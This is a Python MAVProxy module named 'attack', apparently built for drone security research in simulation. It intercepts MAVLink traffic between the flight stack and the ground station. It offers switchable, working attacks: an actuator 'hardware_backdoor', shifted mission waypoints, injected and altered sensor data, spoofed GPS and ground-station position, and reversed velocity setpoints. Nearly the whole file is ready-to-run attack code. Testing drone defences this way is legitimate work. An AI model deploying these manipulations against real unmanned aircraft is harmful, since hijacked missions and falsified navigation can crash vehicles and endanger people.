#QGC: --master 127.0.0.1:14550 --out 127.0.0.1:14551 --cmd="module load attack"
#--master 127.0.0.1:14550 --out 127.0.0.1:14551 --source-system=1 --source-component=1 --cmd="module load attack"
#gazebo: --master=tcpin:127.0.0.1:4561 --out=tcp:127.0.0.1:4560 --cmd="module load attack"
#mavros: --master 127.0.0.1:24540 --out 127.0.0.1:24541 --cmd="module load attack"
# attack hardware_backdoor
# attack reverse_velocity
# attack message_modification
# attack gps
import time, math
from pymavlink import mavutil
import xml.etree.ElementTree as ET
from MAVProxy.modules.lib import mp_module
from MAVProxy.modules.lib import mp_settings
from MAVProxy.modules.lib import mp_util
import random
import copy

class AttackModule(mp_module.MPModule):
    def __init__(self, mpstate):
        super(AttackModule, self).__init__(mpstate, "attack", "attack module")

        self.add_command('attack', self.cmd_attack, "attack module")
        self.hardware_backdoor = False
        self.message_modification = False
        self.gps_spoofing = False
        self.gps = False
        self.gps2 = False
        self.sensor_injection = False
        self.sensor_modification = False
        self.injection = False
        self.gcs_spoof = False
        self.counttt = 0
        self.reverse_velocity = False
        self.has_copied = False # Used to assign a value to a variable only once
        self.newlat = None
        self.newlon = None
    '''initialisation code'''

    def usage(self):
        '''show help on command line options'''
        return "Usage: attack <on/off>"

    def on(self):
        return("OK")

    def cmd_attack(self, args):
        '''control behaviour of the module'''

        if len(args) == 0:
            print(self.usage())
        elif args[0] == "hardware_backdoor":
            if args[1] == "on":
                self.hardware_backdoor = True
            elif args[1] == "off":
                 self.hardware_backdoor = False
        elif args[0] == "message_modification":
            self.message_modification = True
        elif args[0] == "injection":
            self.injection = True
        elif args[0] == "sensor_modification":
            # self.sensor_modification = False
            if args[1] == "on":
                self.sensor_modification = True
            elif args[1] == "off":
                self.sensor_modification = False
        elif args[0] == "sensor_injection":
            self.sensor_injection = True
        elif args[0] == "gps":
            if args[1] == "on":
                self.gps = True
            elif args[1] == "off":
                self.gps = False
        elif args[0] == "gcs":
            if args[1] == "on":
                self.gcs_spoof = True
            elif args[1] == "off":
                self.gcs_spoof = False
        elif args[0] == "reverse_velocity":
            self.reverse_velocity = True

    def mavlink_packet(self, m, mav):
        '''handle a mavlink packet'''
        if self.hardware_backdoor:
            msg_type = m.get_type()
            if msg_type == "HIL_ACTUATOR_CONTROLS":
                m.controls[0] += 0.96
                m.pack(mav)

        if self.gcs_spoof:
            if m.get_type() == "GLOBAL_POSITION_INT":
                if not self.has_copied:
                    self.newlat = m.lat
                    self.newlon = m.lon
                    print(f"Modified Latitude: {self.newlat}, Modified Longitude: {self.newlon}")
                    self.has_copied = True
                m.lon = self.newlon
                m.lat = self.newlat
                m.__init__(m.time_boot_ms, m.lat, m.lon, m.alt, m.relative_alt, m.vx, m.vy, m.vz, m.hdg)
                m.pack(mav)

    def mavlink_backward(self, m, mav):
        '''handle a mavlink packet from the slaves'''
        if self.message_modification:
            if m.get_type() == "MISSION_ITEM_INT":
                m.__init__(m.target_system, m.target_component, m.seq, m.frame, m.command, m.current,
                               m.autocontinue, m.param1, m.param2, m.param3, m.param4, m.x+3000, m.y+3000, m.z, m.mission_type)
                m.pack(mav)
                print("Mission Hacked")

        if self.sensor_modification:
            msg_type = m.get_type()
            if msg_type == "HIL_SENSOR":
                m.__init__(m.time_usec, m.xacc, m.yacc, m.zacc, m.xgyro, m.ygyro, m.zgyro, m.xmag, m.ymag, m.zmag, 
                                                                    m.abs_pressure, m.diff_pressure, m.pressure_alt, m.temperature, m.fields_updated)
                m.pack(mav) 

        
        if self.sensor_injection:
            if m.get_type() == "HIL_SENSOR":
                #print(m.time_usec)
                # new_mav = copy.deepcopy(self.mpstate.mav_outputs[0].mav)
                new_mav = self.mpstate.mav_master[0].mav
                new_mav.srcSystem = 1
                new_mav.srcComponent = 1
                new_mav.hil_sensor_send(m.time_usec-1, 0.1, 0.1, 0.1, 0, 0, 0,
                                                                      1, 1, 1, -3.94092e+29, 4.58141e-41, -9.61733e-41, 4.58127e-36, 63, 0)

        if self.gps:
            msg_type = m.get_type()
            if msg_type == "HIL_GPS":
                m.lon += 1000
                m.lat += 1000
                m.pack(mav)

        if self.reverse_velocity:
            if m.get_type() == "SET_POSITION_TARGET_LOCAL_NED":
                m.vx = -m.vx
                m.vy = -m.vy
                # m.vz -= 2
                # m.__init__(m.time_boot_ms, m.x, m.y, m.z, m.vx, m.vy, m.vz, m.afx, m.afy, m.afz, m.yaw, m.yaw_rate,
                           # m.type_mask, m.target_system, m.target_component, m.coordinate_frame)
                m.__init__(m.time_boot_ms, m.target_system, m.target_component, m.coordinate_frame, m.type_mask,
                           m.x, m.y, m.z, m.vx, m.vy, m.vz, m.afx, m.afy, m.afz, m.yaw, m.yaw_rate)
                m.pack(mav)


def init(mpstate):
    '''initialise module'''
    return AttackModule(mpstate)